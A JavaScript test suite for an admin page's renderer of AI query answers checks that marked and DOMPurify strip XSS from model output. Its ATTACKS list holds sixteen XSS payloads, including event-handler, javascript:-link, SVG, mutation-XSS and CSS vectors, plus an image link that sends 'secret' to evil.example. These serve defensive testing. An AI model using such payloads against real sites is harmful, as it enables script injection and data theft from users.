// NFR13：模型输出的 XSS 直接针对净化配置测试（Story 1.7）。
// 用真实的 vendor 文件（marked 15.0.12、DOMPurify 3.2.6）和页面同一份渲染脚本。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';

const require = createRequire(import.meta.url);
const here = path.dirname(fileURLToPath(import.meta.url));
const admin = path.resolve(here, '../../main/resources/static/admin');
const marked = require(path.join(admin, 'vendor/marked.umd.js'));
const DOMPurify = require(path.join(admin, 'vendor/purify.min.js'));
const factory = require(path.join(admin, 'admin-ai-query-render.js'));

function setup() {
  const dom = new JSDOM('<!DOCTYPE html><body><div id="c"></div></body>', { runScripts: 'outside-only' });
  const { window } = dom;
  window.__pwned = 0;
  window.__loads = [];
  const r = factory({ window, marked, DOMPurify });
  const c = window.document.getElementById('c');
  return { window, r, c, render: (md) => r.renderInto(c, md) };
}

const ATTACKS = [
  '<script>window.__pwned=1</script>',
  '<img src=x onerror="window.__pwned=1">',
  '![x](https://evil.example/collect?d=secret)',
  '<a href="javascript:window.__pwned=1">点我</a>',
  '[点我](javascript:window.__pwned=1)',
  '[点我](JaVaScRiPt:alert(1))',
  '[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '<div onclick="window.__pwned=1" onmouseover="window.__pwned=1">x</div>',
  '<svg onload="window.__pwned=1"><circle/></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<style>body{background:url(https://evil.example/x)}</style>',
  '<form action="https://evil.example"><button>go</button></form>',
  '<p style="background:url(https://evil.example/x)">x</p>',
  '<input type="text" value="x" autofocus onfocus="window.__pwned=1">',
  '<math><mtext><table><mglyph><style><img src=x onerror=window.__pwned=1>',
  '<a href="https://ok.example" onclick="window.__pwned=1">ok</a>',
];

test('NFR13：script / img / 事件属性 / 危险链接都不执行、不加载', () => {
  const { window, c, render } = setup();
  for (const a of ATTACKS) {
    render(`## 结论\n\n${a}\n\n| a | b |\n|---|---|\n| ${a.replace(/\|/g, '')} | 1 |`);
    const html = c.innerHTML;
    assert.equal(c.querySelectorAll('script,img,svg,math,iframe,style,form,button,object,embed,video,audio').length, 0, a);
    for (const el of c.querySelectorAll('*')) {
      for (const attr of el.getAttributeNames()) {
        assert.ok(!/^on/i.test(attr), `${a} → 事件属性 ${attr}`);
        assert.ok(attr !== 'style' && attr !== 'src', `${a} → ${attr}`);
      }
    }
    for (const link of c.querySelectorAll('a[href]')) {
      assert.ok(!/^\s*(javascript|data|vbscript):/i.test(link.getAttribute('href')), a);
    }
    assert.ok(!/<(img|script|iframe)\b/i.test(html), a);
    assert.ok(!c.querySelector('[href*="evil.example/collect"]'), a);
    // 触发所有事件也不执行
    for (const el of c.querySelectorAll('*')) {
      for (const ev of ['click', 'mouseover', 'focus', 'load', 'error']) {
        el.dispatchEvent(new window.Event(ev));
      }
    }
  }
  assert.equal(window.__pwned, 0);
});

test('原始 HTML 按文本显示，图片只留替代文字', () => {
  const { c, render } = setup();
  render('前文 <b>粗</b> 后文\n\n![月度图表](https://x.example/a.png)');
  assert.match(c.textContent, /<b>粗<\/b>/);
  assert.equal(c.querySelectorAll('b').length, 0);
  assert.match(c.textContent, /月度图表/);
  assert.equal(c.querySelectorAll('img').length, 0);
});

test('其余链接带 rel="noopener noreferrer"，新窗口打开', () => {
  const { c, render } = setup();
  render('见 [文档](https://docs.example/a) 与 <mailto:ops@example.com>');
  const links = [...c.querySelectorAll('a')];
  assert.equal(links.length, 2);
  for (const a of links) {
    assert.equal(a.getAttribute('rel'), 'noopener noreferrer');
    assert.equal(a.getAttribute('target'), '_blank');
  }
});

test('版式：结论 → 表格（圆角容器、数字列右对齐）→ 统计口径移到末尾', () => {
  const { c, render } = setup();
  render([
    '10 月共注册 **8,420** 人，第 3 周最多。',
    '',
    '## 统计口径',
    '',
    '按 WIB 时间；不含测试账号。',
    '',
    '| 周 | 新注册 | 占比 |',
    '|---|---|---|',
    '| 10/01–10/07 | 1,612 | 19.1% |',
    '| 合计 | 8,420 | 100% |',
  ].join('\n'));
  const kids = [...c.children];
  assert.equal(kids[0].className, 'aiq-lead');
  assert.equal(kids[0].querySelector('strong').textContent, '8,420');
  assert.equal(kids[1].className, 'aiq-table');
  assert.equal(kids[kids.length - 1].className, 'aiq-scope');
  assert.equal(kids[kids.length - 1].querySelector('b').textContent, '统计口径');
  assert.match(kids[kids.length - 1].textContent, /不含测试账号/);
  const cells = [...c.querySelectorAll('tr')].map((tr) => [...tr.cells].map((td) => td.classList.contains('amt')));
  assert.deepEqual(cells[0], [false, true, true]);
  assert.deepEqual(cells[1], [false, true, true]);
  assert.ok(c.querySelector('tr.aiq-sum'));
});

test('行内「**Cakupan data**：…」也收进 aiq-scope', () => {
  const { c, render } = setup();
  render('Total **12** pengguna.\n\n**Cakupan data**: WIB, tanpa akun uji.');
  const scope = c.querySelector('.aiq-scope');
  assert.ok(scope);
  assert.equal(scope.querySelector('b').textContent, 'Cakupan data');
  assert.match(scope.textContent, /tanpa akun uji/);
  assert.ok(!/^:/.test(scope.querySelector('p').textContent.trim()));
});

test('答案以统计口径开头时，结论仍是后面的正文段落', () => {
  const { c, render } = setup();
  render('**统计口径**：按 WIB 时间。\n\n10 月共 **8,420** 人。');
  const kids = [...c.children];
  assert.equal(kids[0].className, 'aiq-lead');
  assert.match(kids[0].textContent, /8,420/);
  assert.equal(kids[kids.length - 1].className, 'aiq-scope');
  assert.ok(!kids[kids.length - 1].querySelector('.aiq-lead'));
});

test('GFM 任务列表复选框只读；其他 input 不会出现', () => {
  const { c, render } = setup();
  render('- [x] 已核对\n- [ ] 待核对');
  const boxes = [...c.querySelectorAll('input')];
  assert.equal(boxes.length, 2);
  for (const b of boxes) {
    assert.equal(b.getAttribute('type'), 'checkbox');
    assert.ok(b.hasAttribute('disabled'));
  }
});

test('表格对齐等非 URI 属性保留', () => {
  const { c, render } = setup();
  render('| a | b |\n|:--|--:|\n| x | 1 |');
  assert.equal(c.querySelector('th:last-child').getAttribute('align'), 'right');
});
